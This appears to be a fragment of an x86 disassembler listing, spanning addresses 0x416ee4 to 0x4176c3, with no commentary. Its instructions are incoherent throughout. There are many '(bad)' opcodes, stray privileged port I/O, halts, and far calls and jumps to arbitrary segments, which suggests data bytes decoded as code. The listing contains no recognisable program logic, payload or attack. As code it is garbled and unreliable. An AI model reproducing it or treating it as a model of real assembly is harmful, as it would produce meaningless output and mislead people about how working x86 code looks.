  416ee4:	jne    0x416ef7
  416ee6:	mov    WORD PTR [ebp+0x1ebeea05],ss
  416eec:	loope  0x416f6d
  416eee:	mov    ebx,0xc6d75ee4
  416ef3:	cmp    esp,DWORD PTR [ebp+edx*1+0x1fa22d6b]
  416efa:	(bad)  
  416efb:	out    dx,al
  416efc:	dec    edx
  416efd:	retf   0xd373
  416f00:	and    DWORD PTR [ecx],edx
  416f02:	push   esi
  416f03:	dec    edi
  416f04:	in     al,0xf0
  416f06:	mov    cl,0xce
  416f08:	push   esi
  416f09:	jge    0x416f79
  416f0b:	fwait
  416f0c:	out    0xee,eax
  416f0e:	sub    BYTE PTR [esi-0x21],dh
  416f11:	imul   eax,DWORD PTR [ebx-0x6b],0x6c
  416f15:	inc    ebx
  416f16:	lods   eax,DWORD PTR ds:[esi]
  416f17:	(bad)  
  416f18:	push   esp
  416f19:	pusha  
  416f1a:	dec    ebp
  416f1b:	push   esi
  416f1c:	sbb    eax,0x55a9ab20
  416f21:	cmp    DWORD PTR [edi],esi
  416f23:	aam    0x35
  416f25:	sbb    esp,DWORD PTR [ecx+0x23]
  416f28:	jnp    0x416f7a
  416f2a:	in     eax,dx
  416f2b:	or     ebx,DWORD PTR ds:0x97e57e3e
  416f31:	into   
  416f32:	mov    dh,0xaa
  416f34:	mov    ecx,0xe8f2944
  416f39:	lahf   
  416f3a:	adc    DWORD PTR [edx+edx*4],0x68
  416f3e:	pop    ecx
  416f3f:	mov    ds:0x1b4ce879,eax
  416f44:	cmc    
  416f45:	xchg   ebx,eax
  416f46:	addr16 and al,0x5a
  416f49:	mov    bl,BYTE PTR [eax]
  416f4b:	daa    
  416f4c:	mov    eax,0xb984e6e6
  416f51:	mov    esp,0x8f0862ea
  416f56:	push   edx
  416f57:	sahf   
  416f58:	in     eax,dx
  416f59:	in     al,dx
  416f5a:	pop    ebp
  416f5b:	push   eax
  416f5c:	cmp    ebp,ebp
  416f5e:	mov    cl,0xa6
  416f60:	iret   
  416f61:	aam    0x5a
  416f63:	add    ah,BYTE PTR [edx+0x77bb6966]
  416f69:	sti    
  416f6a:	arpl   bp,sp
  416f6c:	(bad)  
  416f6d:	sbb    DWORD PTR [ebp+0x79],eax
  416f70:	arpl   WORD PTR [esi+esi*2-0x11ae219f],si
  416f77:	sbb    bh,BYTE PTR [eax+0x7f]
  416f7a:	mov    WORD PTR [eax-0x34ce620e],fs
  416f80:	mov    eax,0xe906fd19
  416f85:	cld    
  416f86:	push   cs
  416f87:	rcl    BYTE PTR [eax-0x553d7116],0x7d
  416f8e:	fsubr  DWORD PTR [ebx]
  416f90:	inc    eax
  416f91:	sub    ebx,ecx
  416f93:	ret    0x639a
  416f96:	adc    eax,DWORD PTR [edx]
  416f98:	push   cs
  416f99:	out    dx,eax
  416f9a:	lahf   
  416f9b:	xor    esp,ebp
  416f9d:	fwait
  416f9e:	jmp    0x3b705f54
  416fa3:	and    bh,0x5a
  416fa6:	sub    bl,BYTE PTR [ebx-0x72]
  416fa9:	and    esi,eax
  416fab:	clc    
  416fac:	cmp    edi,DWORD PTR [ebx+ebx*1-0x24]
  416fb0:	or     eax,0x2462d56e
  416fb5:	test   BYTE PTR [ebx-0x6e2df1c5],dh
  416fbb:	test   bl,ch
  416fbd:	cli    
  416fbe:	mov    bh,0x18
  416fc0:	je     0x416f82
  416fc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fc3:	pushf  
  416fc4:	push   ebx
  416fc5:	test   BYTE PTR [eax+edi*2-0xd0a072f],cl
  416fcc:	lea    edi,[ecx-0x4b]
  416fcf:	std    
  416fd0:	mov    eax,0x5db3ac89
  416fd5:	shl    DWORD PTR cs:[esi-0x95a0507],1
  416fdc:	mov    dl,dh
  416fde:	cdq    
  416fdf:	xchg   edi,edx
  416fe1:	outs   dx,BYTE PTR ds:[esi]
  416fe2:	imul   eax,DWORD PTR [edi],0x62
  416fe5:	push   es
  416fe6:	xlat   BYTE PTR ds:[ebx]
  416fe7:	jge    0x416f75
  416fe9:	push   es
  416fea:	push   ebx
  416feb:	aaa    
  416fec:	pop    ebx
  416fed:	mov    ah,0x9e
  416fef:	adc    DWORD PTR [edi+edi*1-0x49],edi
  416ff3:	ror    ebx,0xde
  416ff6:	shl    cl,1
  416ff8:	aam    0xb6
  416ffa:	adc    esi,0xffffffa0
  416ffd:	cmp    cl,BYTE PTR ds:0x2c5737fc
  417003:	inc    edx
  417004:	mul    DWORD PTR [esi+ebx*4+0x420e2d40]
  41700b:	cmp    ah,BYTE PTR [esi]
  41700d:	data16 in al,dx
  41700f:	in     al,0x1d
  417011:	pusha  
  417012:	and    dh,BYTE PTR [ecx]
  417014:	adc    BYTE PTR [edi+0x19d406e0],cl
  41701a:	cmp    eax,DWORD PTR [ebp+0x39]
  41701d:	iret   
  41701e:	icebp  
  41701f:	rol    esi,cl
  417021:	or     al,0xca
  417023:	into   
  417024:	repz pushf 
  417026:	inc    edx
  417027:	cmpps  xmm6,XMMWORD PTR [ecx-0x7d],0xa4
  41702c:	dec    ecx
  41702d:	fdivp  st(3),st
  41702f:	sar    ebp,cl
  417031:	outs   dx,BYTE PTR ds:[esi]
  417032:	sbb    esp,DWORD PTR [eax]
  417034:	inc    esp
  417035:	add    edx,ecx
  417037:	mov    ds:0xa9ef6ffa,eax
  41703c:	out    dx,al
  41703d:	(bad)  
  41703f:	jbe    0x4170b9
  417041:	sahf   
  417042:	lds    ecx,FWORD PTR [edx]
  417044:	mov    esp,0xfc40c7bf
  417049:	sbb    BYTE PTR [edi-0x65d1e7a8],cl
  41704f:	mov    edx,0xd250994c
  417054:	ret    
  417055:	cmc    
  417056:	stos   DWORD PTR es:[edi],eax
  417057:	mov    al,ds:0x171ce774
  41705c:	lea    esp,[ebx+edi*4+0x2dff5f6c]
  417063:	aas    
  417064:	mov    edx,ss
  417066:	inc    ebx
  417067:	out    dx,eax
  417068:	hlt    
  417069:	xchg   dl,ch
  41706b:	inc    edx
  41706c:	shr    BYTE PTR [ecx-0x430d9198],0xc2
  417073:	xor    bl,BYTE PTR [eax+0x5d]
  417076:	xchg   esi,eax
  417077:	pop    esp
  417078:	push   0xf60ffc8f
  41707d:	push   es
  41707e:	pop    es
  41707f:	jmp    0x5c4cad8b
  417084:	cs out dx,eax
  417086:	sbb    dh,BYTE PTR [eax-0x79]
  417089:	adc    dl,0x8a
  41708c:	xor    eax,0xdba7ac28
  417091:	fnstsw WORD PTR [ebp-0x53]
  417094:	sub    al,0xe9
  417096:	inc    edi
  417097:	cmp    dl,BYTE PTR [ecx+0x12]
  41709a:	jns    0x41705a
  41709c:	adc    esi,edx
  41709e:	(bad)  
  4170a0:	mov    ds:0x268320f2,eax
  4170a5:	push   ebp
  4170a6:	test   al,0x1d
  4170a8:	pop    eax
  4170a9:	jp     0x41706d
  4170ab:	adc    eax,ebp
  4170ad:	adc    BYTE PTR [ebx-0x44],bl
  4170b0:	jmp    0x9cc02fab
  4170b5:	sbb    ecx,DWORD PTR [edi-0x2ea27932]
  4170bb:	push   ecx
  4170bc:	iret   
  4170bd:	dec    eax
  4170be:	and    eax,0x46b1f749
  4170c3:	adc    eax,0x54b47264
  4170c8:	dec    edi
  4170c9:	imul   esp,DWORD PTR [ecx+0x48],0x37082425
  4170d0:	mov    ds:0x8b4fc6e0,eax
  4170d5:	pop    ds
  4170d6:	ja     0x4170fc
  4170d8:	hlt    
  4170d9:	push   ebp
  4170da:	leave  
  4170db:	inc    ebx
  4170dc:	xor    ah,BYTE PTR [ebx-0x7e2d2602]
  4170e2:	mov    eax,ds:0x6cf2379f
  4170e7:	sub    DWORD PTR [ebx],esp
  4170e9:	test   BYTE PTR ds:0xfcabb303,0x5
  4170f0:	or     BYTE PTR cs:0xf9d74db9,0x1e
  4170f8:	dec    edx
  4170f9:	je     0x4170e0
  4170fb:	or     BYTE PTR [ecx-0x9e5be24],ch
  417101:	mov    BYTE PTR [eax+edi*8+0x6b],dh
  417105:	jae    0x41714f
  417107:	push   esi
  417108:	js     0x4170b9
  41710a:	mov    eax,0x9c9a6eb
  41710f:	imul   ebp,DWORD PTR [ecx-0x73f5ced4],0xffffffc0
  417116:	push   ebp
  417117:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417118:	sub    al,BYTE PTR [edi-0x60]
  41711b:	jmp    0x417173
  41711d:	xchg   ebp,eax
  41711e:	push   es
  41711f:	in     eax,0x2c
  417121:	pop    ebp
  417122:	call   0xe866:0x8ba6dea9
  417129:	dec    edi
  41712a:	xchg   DWORD PTR [ecx],esp
  41712c:	popf   
  41712d:	in     eax,dx
  41712e:	retf   0x818e
  417131:	mov    edx,0x647131b9
  417136:	or     eax,0x54d4cdb3
  41713b:	adc    esp,esp
  41713d:	xor    al,0x30
  41713f:	jl     0x417129
  417141:	leave  
  417142:	loopne 0x4170f0
  417144:	inc    ebp
  417145:	ret    0xae6c
  417148:	jmp    0x2fbc1395
  41714d:	dec    BYTE PTR [ecx]
  41714f:	push   ebx
  417150:	and    ebp,edi
  417152:	inc    esp
  417153:	sub    BYTE PTR [eax-0x49],dl
  417156:	aad    0x9b
  417158:	dec    edi
  417159:	mov    ebx,ebp
  41715b:	mov    bh,0x3f
  41715d:	mov    BYTE PTR [ecx],ch
  41715f:	(bad)  
  417160:	push   edx
  417161:	out    0x93,eax
  417163:	sub    eax,0x55815395
  417168:	dec    ebx
  417169:	shl    DWORD PTR [ecx],1
  41716b:	adc    BYTE PTR [edx+0x76],bl
  41716e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41716f:	xor    al,0x47
  417171:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417172:	(bad)
  417176:	imul   esi,esi,0xa225077f
  41717c:	test   edx,0xf2b18e2c
  417182:	leave  
  417183:	adc    edi,DWORD PTR [esi-0x41b73ad]
  417189:	shr    DWORD PTR [eax+eax*2-0x50],0x92
  41718e:	mov    ds,WORD PTR ds:0xda74cf95
  417194:	push   edi
  417195:	pushf  
  417196:	xchg   edi,eax
  417197:	mov    al,BYTE PTR [ecx-0x727adda7]
  41719d:	inc    ecx
  41719e:	dec    edx
  41719f:	jnp    0x4171d4
  4171a1:	and    al,0xab
  4171a3:	ins    DWORD PTR es:[edi],dx
  4171a4:	mov    ebx,0x8e70bb2f
  4171a9:	repz out 0xb9,eax
  4171ac:	add    al,0x31
  4171ae:	add    al,0x1
  4171b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171b1:	call   0x365041cc
  4171b6:	xor    BYTE PTR [edx-0x4e],cl
  4171b9:	and    ch,dh
  4171bb:	cwde   
  4171bc:	out    0x11,eax
  4171be:	pop    esi
  4171bf:	add    DWORD PTR [edi-0x7e513166],esi
  4171c5:	jmp    0x681d:0x61cf1e71
  4171cc:	mov    edx,DWORD PTR [ecx+0x57bcece9]
  4171d2:	scas   al,BYTE PTR es:[edi]
  4171d3:	push   esi
  4171d4:	push   eax
  4171d5:	mov    esi,0x389d64f1
  4171da:	std    
  4171db:	ins    DWORD PTR es:[edi],dx
  4171dc:	inc    esp
  4171dd:	push   ds
  4171de:	and    BYTE PTR [ebx],al
  4171e0:	or     dh,BYTE PTR [edi+0x34a0c64e]
  4171e6:	jp     0x41718b
  4171e8:	add    al,0x72
  4171ea:	leave  
  4171eb:	popf   
  4171ec:	xchg   ebp,eax
  4171ed:	out    0x9d,eax
  4171ef:	je     0x41720d
  4171f1:	lods   al,BYTE PTR ds:[esi]
  4171f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171f3:	icebp  
  4171f4:	adc    dh,bl
  4171f6:	mov    cl,0x3e
  4171f8:	dec    bp
  4171fa:	iret   
  4171fb:	xchg   esi,eax
  4171fc:	adc    BYTE PTR [edi+edi*4+0x42],dh
  417200:	mov    ebp,0xdad68524
  417205:	lock lods al,BYTE PTR ds:[esi]
  417207:	push   eax
  417208:	add    eax,0x449e088e
  41720d:	and    DWORD PTR [esi+eax*1],ecx
  417210:	test   BYTE PTR [esi+0x7d52dde3],al
  417216:	sub    eax,0xbc616d65
  41721b:	ja     0x417215
  41721d:	add    BYTE PTR [edi+0x1e73c69e],0x9d
  417224:	inc    esp
  417225:	fdiv   QWORD PTR [edi+0x54]
  417228:	in     eax,dx
  417229:	push   eax
  41722a:	sub    al,0x64
  41722c:	les    edi,FWORD PTR [edx+0x636b06b2]
  417232:	outs   dx,DWORD PTR ds:[esi]
  417233:	and    al,0x87
  417235:	mov    edi,0xd2b20d5a
  41723a:	dec    edi
  41723b:	pop    edi
  41723c:	mov    dh,ch
  41723e:	and    edx,DWORD PTR [eax+ebp*8-0x55]
  417242:	push   0xaced37e6
  417247:	je     0x4171f3
  417249:	je     0x4171f1
  41724b:	lock mov al,ds:0x742a7193
  417251:	shr    BYTE PTR [ebx],0x5e
  417254:	and    cl,BYTE PTR [ebp-0x6]
  417257:	inc    ecx
  417258:	(bad)  
  417259:	push   esp
  41725a:	mov    ebx,DWORD PTR [edi]
  41725c:	add    DWORD PTR [edi+0x46],ecx
  41725f:	mov    cl,0xb6
  417261:	lods   al,BYTE PTR ds:[si]
  417263:	neg    BYTE PTR [ebx+0x45d4d116]
  417269:	imul   BYTE PTR [ecx]
  41726b:	aam    0x9e
  41726d:	fabs   
  41726f:	jp     0x4171fe
  417271:	push   ss
  417272:	in     al,0xdf
  417274:	shl    DWORD PTR [edx],1
  417276:	or     DWORD PTR ds:0x7abe8cf5,eax
  41727c:	xchg   esp,eax
  41727d:	adc    DWORD PTR [eax-0x1],0xffffffcc
  417281:	cli    
  417282:	pop    ecx
  417283:	outs   dx,DWORD PTR ds:[esi]
  417284:	mov    ds:0x299d58cc,al
  417289:	inc    ebp
  41728a:	mov    esp,0xc7b2118b
  41728f:	fldcw  WORD PTR [edi-0x1cfd6b66]
  417295:	ss jmp 0x24c94227
  41729b:	push   ecx
  41729c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41729d:	push   ecx
  41729e:	xor    DWORD PTR [eax+edi*4-0x2c6be57e],edx
  4172a5:	mov    ah,0x41
  4172a7:	and    eax,0x664a8c6e
  4172ac:	jae    0x41730d
  4172ae:	gs cdq 
  4172b0:	dec    ebx
  4172b1:	sbb    DWORD PTR [ebp+eax*4-0x8],ecx
  4172b5:	pop    es
  4172b6:	pusha  
  4172b7:	rcr    ebp,0x70
  4172ba:	sub    al,0xfb
  4172bc:	dec    ecx
  4172bd:	jno    0x4172bc
  4172bf:	adc    DWORD PTR [esi],esp
  4172c1:	mov    esp,0xc641ed22
  4172c6:	daa    
  4172c7:	(bad)  
  4172c8:	and    DWORD PTR [esi+0x27],ebp
  4172cb:	push   0xe4b1ca60
  4172d0:	rol    ch,cl
  4172d2:	aaa    
  4172d3:	adc    BYTE PTR [ebp-0x647a3b],dh
  4172d9:	fsubr  DWORD PTR [ebp+0x56a18d4f]
  4172df:	int3   
  4172e0:	adc    al,0x82
  4172e2:	mov    al,ds:0xc21088a5
  4172e7:	mov    al,ds:0x6eacf2e8
  4172ec:	mov    ecx,0x3b66f218
  4172f1:	out    0x50,al
  4172f3:	dec    edx
  4172f4:	jnp    0x4172d4
  4172f6:	aaa    
  4172f7:	sbb    al,0x30
  4172f9:	or     al,0x36
  4172fb:	or     edi,DWORD PTR [esi-0x57]
  4172fe:	loop   0x417297
  417300:	mov    ds:0xc2b0276b,al
  417305:	imul   ebp,DWORD PTR [edi],0x110e7138
  41730b:	inc    ecx
  41730c:	cmp    DWORD PTR [ebx-0x1f],esp
  41730f:	sahf   
  417310:	imul   eax,DWORD PTR [ebx],0x1f5f6991
  417316:	sub    eax,0x4167b8c4
  41731b:	or     al,0x75
  41731d:	jecxz  0x41734c
  41731f:	das    
  417320:	stc    
  417321:	test   eax,0x6d33d4f4
  417326:	inc    ecx
  417327:	retf   
  417328:	bound  edx,QWORD PTR [eax+ebx*1]
  41732b:	xor    eax,0xe62a7974
  417330:	adc    ecx,esp
  417332:	push   edx
  417333:	fdivr  st(3),st
  417335:	(bad)  
  417336:	out    dx,eax
  417337:	dec    ebp
  417338:	sub    dl,BYTE PTR [ebp+0xb3cf6de]
  41733e:	imul   ecx,DWORD PTR [eax-0x76449c9a],0x3dbe6c4e
  417348:	repz lds ecx,FWORD PTR [eax-0x70]
  41734c:	mov    ebp,0x5f82c015
  417351:	cs inc esp
  417353:	sbb    ebp,DWORD PTR [esi]
  417355:	inc    eax
  417356:	and    BYTE PTR [edi],dh
  417358:	mul    BYTE PTR [esi+0x29e88d64]
  41735e:	popa   
  41735f:	ret    0x3660
  417362:	cmp    ebp,DWORD PTR [edx-0x3a]
  417365:	xchg   ebx,eax
  417366:	xor    eax,0xba59fce0
  41736b:	mov    ebp,0x3dee7241
  417370:	cmc    
  417371:	scas   eax,DWORD PTR es:[edi]
  417372:	jnp    0x417348
  417374:	lea    ebp,[ecx-0xb]
  417377:	push   esp
  417378:	dec    ecx
  417379:	popf   
  41737a:	pop    ecx
  41737b:	pusha  
  41737c:	lods   eax,DWORD PTR ds:[esi]
  41737d:	lds    edx,FWORD PTR [ebp-0x2fb63df8]
  417383:	adc    DWORD PTR ds:0x19c7c7ee,esp
  417389:	repz test BYTE PTR [ecx],al
  41738c:	inc    esp
  41738d:	(bad)  
  41738e:	(bad)  
  41738f:	sahf   
  417390:	sub    bl,al
  417392:	or     BYTE PTR [esi],cl
  417394:	lods   eax,DWORD PTR ds:[esi]
  417395:	setbe  BYTE PTR [ecx+0x2]
  417399:	into   
  41739a:	jmp    0x41738d
  41739c:	aam    0x5c
  41739e:	loopne 0x41737b
  4173a0:	dec    ecx
  4173a1:	int3   
  4173a2:	pusha  
  4173a3:	xchg   edx,eax
  4173a4:	mov    ds:0x51820130,eax
  4173a9:	pop    ebp
  4173aa:	adc    eax,0x604a6dc4
  4173af:	pusha  
  4173b0:	add    ebp,edx
  4173b2:	adc    edx,DWORD PTR [edx]
  4173b4:	js     0x4173e1
  4173b6:	cmp    BYTE PTR [ebp-0x48e9a13d],dl
  4173bc:	jle    0x4173df
  4173be:	cdq    
  4173bf:	in     al,0xaf
  4173c1:	fnstenv ds:0xbbb23954
  4173c7:	push   eax
  4173c8:	cmp    al,0xce
  4173ca:	dec    ebx
  4173cb:	dec    ecx
  4173cc:	int3   
  4173cd:	or     eax,0xfe4cdcc
  4173d2:	shl    BYTE PTR [ebx-0x5c92b993],0xd6
  4173d9:	adc    ah,BYTE PTR [edx+0x48]
  4173dc:	and    eax,0xd93c2099
  4173e1:	imul   esp,DWORD PTR [eax+0x9],0x65
  4173e5:	(bad)  
  4173e6:	sahf   
  4173e7:	jle    0x417443
  4173e9:	rcl    ah,1
  4173eb:	xor    al,0x65
  4173ed:	test   ch,ah
  4173ef:	jmp    0x41737b
  4173f1:	in     al,0x5f
  4173f3:	add    edx,esi
  4173f5:	sbb    eax,0xaa1e759f
  4173fa:	repnz pushf 
  4173fc:	sub    al,0x2
  4173fe:	mov    ds:0x69e9f214,eax
  417403:	pop    edi
  417404:	mov    esp,DWORD PTR [eax]
  417406:	xor    al,ah
  417408:	inc    esp
  417409:	outs   dx,BYTE PTR ds:[esi]
  41740a:	(bad)  
  41740b:	cmp    esi,DWORD PTR [ebx-0x6e]
  41740e:	sbb    cl,BYTE PTR [edi]
  417410:	mov    al,0xa6
  417412:	lea    esp,[ebx+0x64]
  417415:	fimul  DWORD PTR [edi]
  417417:	and    eax,0x1c53b2c7
  41741c:	ins    BYTE PTR es:[edi],dx
  41741d:	iret   
  41741e:	xor    ecx,0x58060287
  417424:	xor    DWORD PTR [esi+0x54],ebp
  417427:	sbb    BYTE PTR [eax-0x59e342e6],ch
  41742d:	pop    es
  41742e:	pop    esp
  41742f:	ror    al,1
  417431:	or     eax,0x1f3ab692
  417436:	call   0x163a:0x95b8338e
  41743d:	sub    eax,0x2573e60
  417442:	addr16 jb 0x417432
  417445:	xchg   edi,edx
  417447:	xchg   edx,eax
  417448:	mov    esi,0x2959ecac
  41744d:	les    esp,FWORD PTR [edi]
  41744f:	in     eax,dx
  417450:	cmp    eax,0x5b5b4afa
  417455:	jb     0x417463
  417457:	push   edi
  417458:	cmp    ch,dl
  41745a:	enter  0x9755,0xe0
  41745e:	ss pop ebx
  417460:	repz imul ebx,ebp,0xf54c7f11
  417467:	xlat   BYTE PTR ds:[ebx]
  417468:	sbb    al,BYTE PTR [ebx+0x34]
  41746b:	jl     0x4173fd
  41746d:	pop    ebp
  41746e:	and    esi,DWORD PTR cs:[ebx+0x24]
  417472:	and    BYTE PTR [ebx+0x4a626d44],dh
  417478:	out    0x0,al
  41747a:	test   eax,0x6d09740a
  41747f:	cmc    
  417480:	scas   eax,DWORD PTR es:[edi]
  417481:	xor    al,0x22
  417483:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417484:	and    ebp,DWORD PTR [ebx-0x5b]
  417487:	popa   
  417488:	mov    al,0x31
  41748a:	(bad)  
  41748b:	scas   eax,DWORD PTR es:[edi]
  41748c:	imul   ebp,DWORD PTR [esi],0xffffffa6
  41748f:	xor    eax,0xe9cadf29
  417494:	nop
  417495:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417496:	dec    eax
  417497:	jno    0x417496
  417499:	sbb    DWORD PTR [esi],esp
  41749b:	xor    edi,DWORD PTR [eax]
  41749d:	pop    edx
  41749e:	sub    al,0x4f
  4174a0:	test   DWORD PTR [ebx],edi
  4174a2:	outs   dx,BYTE PTR ds:[esi]
  4174a3:	pop    edx
  4174a4:	ret    
  4174a5:	pushf  
  4174a6:	xor    ecx,edi
  4174a8:	addr16 mov edi,0x6c65594c
  4174ae:	sub    cl,BYTE PTR [edi+esi*2-0x22]
  4174b2:	icebp  
  4174b3:	pushf  
  4174b4:	xchg   esp,eax
  4174b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174b6:	mov    WORD PTR [esi-0x67],gs
  4174b9:	push   0x5a
  4174bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174bc:	sub    cl,BYTE PTR [ecx+ebx*8+0x6de9d1a2]
  4174c3:	adc    BYTE PTR [edx-0x48],ch
  4174c6:	mov    ebp,0x321e711
  4174cb:	ret    
  4174cc:	sub    ch,BYTE PTR [edi-0x7d7f9ccd]
  4174d2:	or     DWORD PTR [esp+ebp*4],0xffffffad
  4174d6:	ss hlt 
  4174d8:	fs push 0xc740c7e1
  4174de:	jl     0x4174c5
  4174e0:	pushf  
  4174e1:	jne    0x41747e
  4174e3:	enter  0x3947,0x38
  4174e7:	fild   DWORD PTR [ebp+0x2de317d2]
  4174ed:	cs dec ecx
  4174ef:	add    al,0xb1
  4174f1:	cmp    ebx,ebp
  4174f3:	test   DWORD PTR [ebx],ebp
  4174f5:	mov    ds:0x7e74064b,eax
  4174fa:	shr    DWORD PTR [ecx+0x1a3e3d40],cl
  417500:	aas    
  417501:	call   0xe34c6936
  417506:	pop    esp
  417507:	jb     0x41755a
  417509:	mov    ecx,0xfce2e6d5
  41750e:	aaa    
  41750f:	inc    ebp
  417510:	sbb    al,0x3c
  417512:	lods   eax,DWORD PTR ds:[esi]
  417513:	dec    eax
  417514:	jmp    FWORD PTR ds:0x1f46714a
  41751a:	xor    bh,BYTE PTR [ebp+0x1d2afaf4]
  417520:	das    
  417521:	inc    esi
  417522:	pop    ebx
  417523:	dec    esi
  417524:	mov    dl,0x57
  417526:	neg    BYTE PTR [ebp+0x37]
  417529:	mov    bl,0xae
  41752b:	adc    BYTE PTR [edx-0x3f],bl
  41752e:	fdivrp st(1),st
  417530:	cwde   
  417531:	sub    ch,BYTE PTR [esi]
  417533:	xchg   DWORD PTR [eax+0x25],edi
  417536:	cmp    DWORD PTR [ebx],ecx
  417538:	sub    al,0x5e
  41753a:	xor    al,0x63
  41753c:	sub    BYTE PTR [eax+0x58b2b5cc],cl
  417542:	mov    al,0xbc
  417544:	mov    al,ds:0x9938c6fa
  417549:	into   
  41754a:	xlat   BYTE PTR ds:[ebx]
  41754b:	xchg   DWORD PTR [ebx-0x4ce21fd],esp
  417551:	call   0xd7ff:0xb1f2486d
  417558:	ss cmp al,0x52
  41755b:	sub    al,0xc4
  41755d:	call   0x8b21:0x9da5720b
  417564:	push   edi
  417565:	dec    ebp
  417566:	mov    ebp,0xeec97bb2
  41756b:	(bad)  
  41756d:	push   cs
  41756e:	jno    0x41755e
  417570:	sub    ecx,DWORD PTR [edi+0x44]
  417573:	jo     0x417564
  417575:	ins    DWORD PTR es:[edi],dx
  417576:	(bad)  
  417577:	push   ss
  417578:	push   ss
  417579:	or     ah,BYTE PTR [esi-0x4e]
  41757c:	lahf   
  41757d:	mov    dh,0x36
  41757f:	dec    ebx
  417580:	adc    eax,eax
  417582:	in     al,dx
  417583:	pop    ss
  417584:	ins    BYTE PTR es:[edi],dx
  417585:	xchg   esi,eax
  417586:	jecxz  0x4175a8
  417588:	add    eax,0xcc5e8d98
  41758d:	addr16 aas 
  41758f:	in     eax,dx
  417590:	out    0x2d,eax
  417592:	enter  0xc2e1,0x16
  417596:	pop    eax
  417597:	cmp    eax,0x5fd9c945
  41759c:	mov    WORD PTR [edi+0x2f],si
  4175a0:	sub    eax,0x6288a3c0
  4175a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175a6:	rcr    DWORD PTR [ebp-0x6b0009a6],cl
  4175ac:	pop    edi
  4175ad:	sahf   
  4175ae:	pop    ecx
  4175af:	and    dh,BYTE PTR [eax-0x1a7e8702]
  4175b5:	add    eax,esi
  4175b7:	addr16 cli 
  4175b9:	mov    DWORD PTR [ecx],edi
  4175bb:	adc    BYTE PTR ss:[esi+edx*8-0x76b8ad64],bl
  4175c3:	out    0x40,eax
  4175c5:	ds (bad) 
  4175c8:	pusha  
  4175c9:	inc    edx
  4175ca:	ja     0x4175a1
  4175cc:	dec    edx
  4175cd:	sbb    edi,edx
  4175cf:	std    
  4175d0:	pop    edi
  4175d1:	das    
  4175d2:	fidivr DWORD PTR [edx+0xd]
  4175d5:	and    eax,0xfe9629c8
  4175da:	mov    WORD PTR [ecx-0x2039d304],cs
  4175e0:	mov    al,0x96
  4175e2:	rcr    DWORD PTR [ebx],cl
  4175e4:	fdivr  st(5),st
  4175e6:	stc    
  4175e7:	int3   
  4175e8:	push   ss
  4175e9:	inc    edi
  4175ea:	pop    ds
  4175eb:	sub    al,0x4d
  4175ed:	xor    al,0xa0
  4175ef:	pop    ss
  4175f0:	dec    edi
  4175f1:	pop    edi
  4175f2:	pop    esi
  4175f3:	jne    0x41759c
  4175f5:	push   es
  4175f6:	shr    BYTE PTR [edx],0x13
  4175f9:	xor    bl,BYTE PTR [ebp+0x9]
  4175fc:	sti    
  4175fd:	dec    esp
  4175fe:	sti    
  4175ff:	sar    BYTE PTR [esi],cl
  417601:	sbb    cl,BYTE PTR [edx+0x22]
  417604:	inc    edi
  417605:	xchg   esp,eax
  417606:	add    BYTE PTR [eax-0x2c],0x79
  41760a:	adc    al,0xec
  41760c:	stos   BYTE PTR es:[edi],al
  41760d:	add    eax,0x1dde7e09
  417612:	repz xchg esi,eax
  417614:	and    al,al
  417616:	jne    0x417622
  417618:	mov    dh,0x94
  41761a:	sahf   
  41761b:	test   al,bh
  41761d:	call   DWORD PTR [edi-0x62d05fc8]
  417623:	stc    
  417624:	sbb    al,0x4a
  417626:	mov    dl,bh
  417628:	jecxz  0x4175eb
  41762a:	hlt    
  41762b:	leave  
  41762c:	dec    ebp
  41762d:	mov    esp,0x2b365678
  417632:	mov    esi,0x5bebe3e0
  417637:	jle    0x417678
  417639:	pushf  
  41763a:	cmp    esi,DWORD PTR [eax+ecx*2-0x50]
  41763e:	std    
  41763f:	test   BYTE PTR [esi+edx*1],ah
  417642:	lods   eax,DWORD PTR ds:[esi]
  417643:	add    DWORD PTR [ebx+eiz*1+0x1],eax
  417647:	xchg   ecx,eax
  417648:	sub    BYTE PTR [esi+0x5f6f400],bh
  41764e:	cli    
  41764f:	in     al,dx
  417650:	iret   
  417651:	jne    0x4175e7
  417653:	inc    ecx
  417654:	push   0x2d
  417656:	icebp  
  417657:	inc    edi
  417658:	scas   eax,DWORD PTR es:[edi]
  417659:	mov    bh,0x15
  41765b:	idiv   DWORD PTR [edx+0x2a4527eb]
  417661:	or     ecx,DWORD PTR [edx-0x5]
  417664:	cmp    ecx,DWORD PTR [eax+0x7997730f]
  41766a:	pop    ebp
  41766b:	std    
  41766c:	and    BYTE PTR [edx-0x4a2712ce],bl
  417672:	inc    ebx
  417673:	pusha  
  417674:	in     eax,dx
  417675:	bound  eax,QWORD PTR [eax+edi*8]
  417678:	and    ch,dh
  41767a:	out    dx,eax
  41767b:	(bad)
  41767e:	jge    0x417624
  417680:	adc    dh,0xac
  417683:	add    ebx,eax
  417685:	adc    bl,al
  417687:	stc    
  417688:	xlat   BYTE PTR ds:[ebx]
  417689:	int    0xff
  41768b:	jae    0x417611
  41768d:	mov    ds:0xdb99fa9a,eax
  417692:	and    eax,0x14ae6fd1
  417697:	out    0x1,al
  417699:	inc    esi
  41769a:	mov    bh,BYTE PTR [eax]
  41769c:	xchg   DWORD PTR [ebx],eax
  41769e:	call   0xb40a:0x48fe1c76
  4176a5:	inc    ebx
  4176a6:	adc    eax,0x123808cb
  4176ab:	rol    DWORD PTR [edi],1
  4176ad:	jmp    0x67b1:0x6b0a1e0c
  4176b4:	iret   
  4176b5:	inc    edx
  4176b6:	xchg   ebp,eax
  4176b7:	aam    0x38
  4176b9:	xchg   edx,ebp
  4176bb:	push   ecx
  4176bc:	xchg   ecx,eax
  4176bd:	pop    eax
  4176be:	mov    ds:0xc4bcecad,al
  4176c3:	mov    BYTE PTR [esi-0x2d8b2075],al
